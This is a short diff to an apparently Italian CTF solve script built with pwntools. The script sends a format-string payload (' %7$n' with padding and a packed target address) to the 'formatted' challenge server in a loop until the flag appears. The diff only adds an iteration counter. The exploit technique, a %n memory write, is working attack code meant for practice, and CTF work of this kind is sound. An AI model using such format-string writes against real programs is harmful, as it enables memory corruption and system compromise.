@@ -28,16 +28,20 @@ addr = p64(0x40404c)  # address di flag
 payload = " %7$n"
 data = ""
 
+i = 0
 while "flag" not in data:
     r = remote("formatted.challs.olicyber.it",  10305)
     r.recv(512)
 
+    print(i)
     payload += " "
     r.sendline(payload.encode() + addr)
 
     data = r.recvall(timeout=2).decode()
 
     r.close()
+
+    i+=1
 
 print("\n\n")
 print("".join(re.findall(r"flag\{.*?\}", data)))
